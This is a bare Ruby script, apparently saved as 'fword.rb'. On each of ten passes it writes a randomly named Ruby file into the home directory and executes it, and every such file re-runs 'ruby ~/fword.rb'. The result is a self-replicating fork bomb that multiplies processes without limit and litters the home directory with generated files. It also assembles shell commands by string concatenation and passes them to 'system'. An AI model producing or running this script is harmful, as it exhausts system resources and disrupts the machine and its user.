#!/usr/bin/ruby

 
 x = 0
 
 while x < 10 
 	x += 1    
 		string ="A#{x}"
		o = [('a'..'z'), ('A'..'Z')].map { |i| i.to_a }.flatten
		st = (0...50).map { o[rand(o.length)] }.join


lf = '"'
ln = "\n"
l1 =  '#!/usr/bin/ruby'
l2 = %Q(x1 = 'ruby ~/fword.rb')
l3 = 'system( x1 )'

code = [lf,l1,ln,l2,ln,l3,lf].reject(&:empty?).join('')


	c1 = 'echo '
	c2 = code
	c3 = ' > ~/'
	c4 = st
	c5 = '.rb'
	
	cmd = [c1,c2,c3,c4,c5].reject(&:empty?).join('')

	

	system( cmd )



	x1 = 'ruby ~/'
	x2 = st
	x3 = '.rb'
	cod = [x1, x2, x3].reject(&:empty?).join('')
	system(cod)






end
	